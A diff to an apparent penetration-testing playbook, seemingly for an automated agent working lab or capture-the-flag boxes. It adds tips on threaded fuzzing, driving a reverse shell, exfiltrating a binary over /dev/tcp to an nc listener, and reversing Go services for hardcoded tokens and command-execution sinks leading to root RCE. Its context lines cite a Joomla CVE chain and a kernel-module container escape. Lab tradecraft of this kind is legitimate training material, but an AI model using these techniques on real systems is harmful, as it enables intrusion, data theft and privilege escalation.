@@ -241,6 +241,25 @@ Chain: Joomla CVE-2023-23752 (leaks DB pass) -> cred-reuse to root SSH on a pivo
 - **Modern CMS/SPA admin panels are JS-rendered** (`curl` sees only chrome): don't grind a template-editor RCE over curl against a Joomla 4/SPA admin - drive a browser, or the foothold is elsewhere.
 - **Privesc = linpeas/pspy FIRST, not hand-rolled `ls`/`find`/`cat`.** `cap_sys_module` escape (`capsh --print | grep sys_module`): build+`insmod` a module (`call_usermodehelper`); if headers != running kernel, patch the `.ko` vermagic to `uname -r`. See [[linux-privesc]].
 
+## Lesson: parallel enum, a clean reverse-shell driver, custom-service RE (speed)
+
+- **Never serial-curl a numeric/name range.** A `for i in $(seq ...); do curl ...; done` loop fetches
+  one URL at a time and is the difference between a 10-min and a 40-min box. Fan out threaded from the
+  FIRST open port: `ffuf -t 80 -w <(seq -f '%04g' 0 9999) -u http://$T/path/FUZZ/ -mc 200` (or
+  `xargs -P50`). The `.serial-enum-nudged` reflex catches this live; do not wait for it.
+- **Drive a reverse shell with `bash scripts/vm-rsh.sh <eng> '<cmd>'`, NOT hand-rolled
+  `tmux send-keys` + `capture-pane`.** It base64-wraps the command so any quoting/metachars survive the
+  vm.sh -> ssh -> tmux bridge and returns ONLY the command's output between markers. Hand-driving
+  send-keys and losing turns to shell-quoting (nested quotes, failed base64 wrappers) is the recurring
+  drift this removes. (Quick throwaway one-liners can still go direct; anything with quotes/pipes uses vm-rsh.)
+- **A custom network service (esp. a Go `net/http` server on an odd port) = pull the binary and RE it,
+  do not brute the protocol.** Exfil it (`cat /path/bin > /dev/tcp/<lhost>/<port>` to an `nc -lvnp`
+  listener), then `GOROOT=$(ls -d /usr/local/go /usr/lib/go-* | head -1) go tool objdump -s main.<fn>`
+  (or GNU `objdump -d`): a `runtime.memequal`/`strcmp` on the auth check means the code/token is a
+  PLAINTEXT string in `.rodata` (read it from the `LEAQ` target VA via the readelf LOAD offset), and an
+  `os/exec.Command` sink means your input runs as a shell command AS WHATEVER USER the service runs -
+  check `systemctl cat <svc>` for `User=`. Extract the code, hit the sink -> RCE as that user (often root).
+
 ## Capture (engagement discipline)
 
 After each phase, write to `targets/<eng>/`: hosts/access -> `state.md`, creds -> `loot.md`, chain -> `paths.md`, vulns -> `Vuln-index.md`, dead-ends -> `Deadends.md`, narrative -> `log.md`. Flags go in the writeup, never in `session/*` or `wiki/`.
